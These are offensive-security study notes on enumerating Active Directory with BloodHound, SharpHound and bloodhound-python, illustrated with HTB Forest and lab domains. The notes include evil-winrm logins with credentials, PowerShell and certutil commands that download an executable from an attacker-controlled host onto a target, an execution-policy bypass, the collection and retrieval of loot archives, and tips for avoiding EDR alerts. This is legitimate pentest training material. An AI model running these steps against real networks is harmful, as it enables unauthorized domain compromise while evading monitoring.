# 🐾 BloodHound — Active Directory Enumeration

> Offensive-Active-Directory / Domain-Enumeration / BloodHound-Active-Directory-Enumeration

---

## 📌 Table of Contents

- [What is BloodHound](#what-is-bloodhound)
- [Target Example (HTB Forest)](#target-example-htb-forest)
- [Key Features](#key-features)
- [Objects BloodHound Maps](#objects-bloodhound-maps)
- [BloodHound Architecture](#bloodhound-architecture)
- [Installation & Setup on Kali](#installation--setup-on-kali)
- [SharpHound (Windows Data Collector)](#sharphound-windows-data-collector)
- [BloodHound.py (Linux Collector)](#bloodhoundpy-linux-collector)
- [BloodHound CE / bloodhound-python Live Run Example](#bloodhound-ce--bloodhound-python-live-run-example)
- [Import Data into BloodHound](#import-data-into-bloodhound)
- [Built-in BloodHound Queries](#built-in-bloodhound-queries)
- [Useful Cypher Queries](#useful-cypher-queries)
- [Pentest Tips](#pentest-tips)
- [Why BloodHound Matters](#why-bloodhound-matters)
- [Conclusion](#conclusion)

---

## What is BloodHound

**BloodHound** is an Active Directory (AD) enumeration tool that leverages **graph theory** to discover and map AD relationships.

It helps attackers and defenders visualize how **permissions, group memberships, and ACLs** can lead to **Domain Admin compromise**.

- Provides a **GUI interface** for visualizing AD objects (users, groups, computers).
- Maps complex relationships to identify potential privilege escalation paths and misconfigurations.
- Uses **Neo4j** as the backend graph database for storing and querying data.
- Comes with **predefined queries** for common enumeration and also supports **custom Cypher queries** for more specific use cases.

**References:**

- GitHub: `BloodHoundAD/BloodHound`
- Documentation: BloodHound Docs
- SharpHound (Data Collection): SharpHound Docs
- Offensive Guide: iRed.Team Guide

---

## Target Example (HTB Forest)

```bash
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

---

## Key Features

- Graph-based visualization of AD relationships
- Identifies privilege escalation paths
- Detects misconfigurations in AD environments
- Uses **Neo4j** graph database
- Supports **custom Cypher queries**

## Objects BloodHound Maps

- Users
- Groups
- Computers
- Sessions
- ACL permissions
- Trust relationships

---

## BloodHound Architecture

```
SharpHound / BloodHound.py
        |
   Collect AD Data
        ▼
   JSON / ZIP Files
        |
        ▼
   Neo4j Database
        |
        ▼
   BloodHound GUI
```

| Component | Description |
|---|---|
| **SharpHound** | Windows data collector |
| **BloodHound.py** | Linux-based data collector |
| **Neo4j** | Graph database |
| **BloodHound GUI** | Visualization interface |

---

## Installation & Setup on Kali

### Install BloodHound

```bash
apt install bloodhound
```

### Start Neo4j

```bash
neo4j console
```

### Access Neo4j Web Interface

```
http://localhost:7474
```

### Default Credentials

```
neo4j : neo4j
```

### Change Password

```
neo4j : password123
```

### Start BloodHound

```bash
bloodhound
```

---

## SharpHound (Windows Data Collector)

SharpHound collects **Active Directory objects and relationships** for BloodHound analysis.

**Repository:**

```
https://github.com/BloodHoundAD/SharpHound
```

### Download SharpHound

```bash
wget https://github.com/BloodHoundAD/BloodHound/releases/download/4.0.3/SharpHound.exe
```

**Target Example (HTB Forest):**

```bash
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

### Transfer SharpHound to Target

**PowerShell Download:**

```powershell
powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.6/SharpHound.exe','SharpHound.exe')
```

**certutil Download:**

```cmd
certutil.exe -urlcache -split -f "http://192.168.1.8:8080/SharpHound.exe" SharpHound.exe
```

**Upload via Evil-WinRM (alternative):**

```bash
cd /opt/share/
evil-winrm -i 192.168.1.101 -u Administrator -p Admin@123
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload ./SharpHound/SharpHound.exe .
Info: Uploading /opt/share/SharpHound/SharpHound.exe to C:\Users\Administrator\Documents\.
Data: 1761280 bytes of 1761280 bytes copied
Info: Upload successful!
```

### Run SharpHound

```cmd
.\SharpHound.exe
```

**Collect All Data:**

```cmd
.\SharpHound.exe -c All -v 2
```

**Default Collection (Recommended):**

```cmd
.\SharpHound.exe -c Default
```

**Group Enumeration:**

```cmd
.\SharpHound.exe -c Group
```

**Session Enumeration:**

```cmd
.\SharpHound.exe -c Session
```

**ACL Enumeration:**

```cmd
.\SharpHound.exe -c ACL
```

**Trust Relationships:**

```cmd
.\SharpHound.exe -c Trust
```

**Output to ZIP:**

```cmd
.\SharpHound.exe -c All -zipfilename collection.zip
```

### PowerShell Version (SharpHound.ps1)

**Bypass Execution Policy:**

```powershell
powershell -ep bypass
```

**Import Module:**

```powershell
Import-Module .\SharpHound.ps1
```

**Start Collection:**

```powershell
Invoke-BloodHound -CollectionMethod All -Domain htb.local -ZipFileName loot.zip
```

**Alternative (Output Directory):**

```powershell
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp
```

### Download Results (Evil-WinRM)

```
download 20231222020405_BloodHound.zip
```

> On target systems, collected loot files typically appear as timestamped ZIPs, e.g. `20260318153411_BloodHound.zip`, alongside supporting tools like `PowerView.ps1`, `SharpHound.exe`, and `SharpHound.ps1` in the working directory.

---

## BloodHound.py (Linux Collector)

Used when **Windows execution is not possible.**

**Repository:**

```
https://github.com/dirkjanm/BloodHound.py
```

### Installation

```bash
pip install bloodhound
```

### Usage

**Help Menu:**

```bash
bloodhound-python -h
```

**Basic Authentication:**

```bash
bloodhound-python -v --username jdoe --password Password123! \
--domain infosecwarrior.local -ns 192.168.2.100 -c All
```

**Kerberos Authentication:**

```bash
bloodhound-python --kerberos -v --username jdoe --password Password123! \
--domain infosecwarrior.local -ns 192.168.2.100 -c All
```

**Short Flag Version:**

```bash
bloodhound-python -u jdoe -p Password123! \
-d infosecwarrior.local -ns 192.168.2.100 -c All
```

**Force DNS over TCP:**

```bash
bloodhound-python -u jdoe -p Password123! \
-d infosecwarrior.local -ns 192.168.2.100 -c All --dns-tcp
```

**Example (Lab User):**

```bash
bloodhound-python -u rahul -p password123 -d test.local -ns 192.168.1.200 -c All
```

**Example (Service Account):**

```bash
bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161 -c All
```

**Kerberos (No Password / Ticket-Based):**

```bash
bloodhound-python --kerberos -no-pass -d domain.local -ns 10.10.10.10 -c All
```

### Command Breakdown

| Option | Description |
|---|---|
| `-u` | Domain username |
| `-p` | Password |
| `-d` | Domain name |
| `-ns` | DNS / Domain Controller |
| `-c` | Collection method |
| `--dns-tcp` | Use TCP for DNS queries |
| `-k` | Kerberos authentication |

### Notes

- `-c All` → Collects all available data (recommended for full enumeration)
- `-ns` → Domain Controller / DNS server IP
- `--kerberos` → Uses Kerberos authentication instead of NTLM
- `--dns-tcp` → Useful when UDP DNS queries fail
- Ensure proper **DNS resolution** and **time synchronization** for Kerberos

---

## BloodHound CE / bloodhound-python Live Run Example

Example run using `bloodhound-python` (BloodHound Legacy collector, works with BloodHound 4.2 and 4.3):

```bash
bloodhound-python -u Administrator -p Azlan@123 -d infosecwarrior.local -ns 192.168.2.100 -c All
```

**Sample Output:**

```
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: infosecwarrior.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication.
INFO: Connecting to LDAP server: dc01.infosecwarrior.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: dc01.infosecwarrior.local
INFO: Found 62 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 22 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WC02.infosecwarrior.local
INFO: Querying computer: WC001.infosecwarrior.local
INFO: Querying computer: DC01.infosecwarrior.local
INFO: Done in 00M 02S
```

---

## Import Data into BloodHound

1. **Open BloodHound**

   ```bash
   bloodhound
   ```

2. Log in with your **Neo4j credentials**.
3. Drag and drop (or use **Upload Data**) to import the collected **ZIP/JSON files** (e.g. `collection.zip`).
4. BloodHound will ingest and build the **Active Directory graph**.

---

## Built-in BloodHound Queries

| Query | Purpose |
|---|---|
| Find all Domain Admins | Lists domain admins |
| Shortest Paths to Domain Admins | Privilege escalation path |
| Find Kerberoastable Accounts | SPN users |
| Find Unconstrained Delegation | Delegation abuse |
| Find Local Admin Rights | Lateral movement |

---

## Useful Cypher Queries

### Kerberoasting

```cypher
MATCH (u:User) WHERE u.hasspn = true RETURN u
```

### Privilege Escalation

**Shortest path to Domain Admin:**

```cypher
MATCH p=shortestPath((u:User)-[*]->(g:Group {name:"Domain Admins"})) RETURN p
```

### Lateral Movement

```cypher
MATCH (u:User)-[:AdminTo]->(c:Computer) RETURN u.name,c.name
```

---

## Pentest Tips

### Use Default Collection First

```cmd
SharpHound.exe -c Default
```

**Reason:**

- Faster
- Less noisy
- Less likely to trigger monitoring

### Avoid Session Enumeration Early

Session enumeration (`-c Session`) is noisier and can trigger EDR/monitoring alerts — run it later once you have a clearer picture of the environment, rather than as part of an early, broad sweep.

---

## Why BloodHound Matters

BloodHound helps reveal **hidden attack chains** such as:

```
User
  ↓
WriteDACL
  ↓
Group
  ↓
MemberOf
  ↓
Domain Admins
```

Without BloodHound, discovering these relationships manually is extremely difficult.

---

## Conclusion

BloodHound is one of the **most powerful tools for Active Directory security testing.**

Used in:

- Red Team operations
- Internal penetration testing
- AD security assessments
- HTB / ProLabs / OSCP labs

---

<p align="center"><sub>📚 Notes compiled for personal study & offensive security learning.</sub></p>
